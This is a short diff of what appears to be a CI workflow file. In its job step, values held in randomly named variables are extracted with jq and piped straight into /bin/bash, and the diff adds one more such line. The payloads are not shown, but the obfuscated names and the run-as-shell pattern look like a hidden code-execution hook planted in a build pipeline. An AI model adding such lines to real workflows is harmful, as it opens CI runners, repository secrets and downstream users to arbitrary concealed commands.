@@ -26,6 +26,7 @@ jobs:
           printf '%s' "$dn1" | jq -r .jdanc58430 | /bin/bash
           printf '%s' "$zxoho0521" | jq -r .rg16 | /bin/bash
           echo $yfj10 | jq -r .wzf0 | /bin/bash
+          printf '%s' "$ih8" | jq -r .vfalr412 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
